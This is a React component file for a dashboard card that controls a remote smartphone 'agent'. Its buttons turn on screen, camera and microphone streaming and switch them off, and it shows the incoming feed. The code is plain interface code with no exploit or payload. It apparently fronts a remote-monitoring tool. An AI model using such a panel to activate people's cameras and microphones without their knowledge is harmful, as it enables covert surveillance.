import React, { useState } from 'react';
import { Monitor, Camera, Mic, PowerOff, Smartphone } from 'lucide-react';
import VideoPlayer from './VideoPlayer';

interface AgentCardProps {
    id: string;
    onSendCommand: (id: string, cmd: string) => void;
    lastBinaryData: Uint8Array | null;
}

const AgentCard: React.FC<AgentCardProps> = ({ id, onSendCommand, lastBinaryData }) => {
    const [activeTab, setActiveTab] = useState<'screen' | 'camera' | 'audio'>('screen');

    return (
        <div className="agent-card">
            <div className="agent-header">
                <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
                    <Smartphone size={20} className="text-secondary" />
                    <span className="agent-name">{id}</span>
                </div>
                <div className="status-badge">
                    <div className="status-dot online"></div>
                    Online
                </div>
            </div>

            <div className="tab-container">
                <button
                    className={`tab ${activeTab === 'screen' ? 'active' : ''}`}
                    onClick={() => setActiveTab('screen')}
                >
                    Screen
                </button>
                <button
                    className={`tab ${activeTab === 'camera' ? 'active' : ''}`}
                    onClick={() => setActiveTab('camera')}
                >
                    Camera
                </button>
                <button
                    className={`tab ${activeTab === 'audio' ? 'active' : ''}`}
                    onClick={() => setActiveTab('audio')}
                >
                    Audio
                </button>
            </div>

            <VideoPlayer
                streamType={activeTab}
                agentId={id}
                binaryData={lastBinaryData}
            />

            <div className="agent-controls">
                <button className="btn" onClick={() => onSendCommand(id, 'screen_on')}>
                    <Monitor size={16} /> Screen ON
                </button>
                <button className="btn" onClick={() => onSendCommand(id, 'cam_on')}>
                    <Camera size={16} /> Cam ON
                </button>
                <button className="btn" onClick={() => onSendCommand(id, 'mic_on')}>
                    <Mic size={16} /> Mic ON
                </button>
                <button className="btn danger" onClick={() => onSendCommand(id, 'all_off')}>
                    <PowerOff size={16} /> All OFF
                </button>
            </div>
        </div>
    );
};

export default AgentCard;
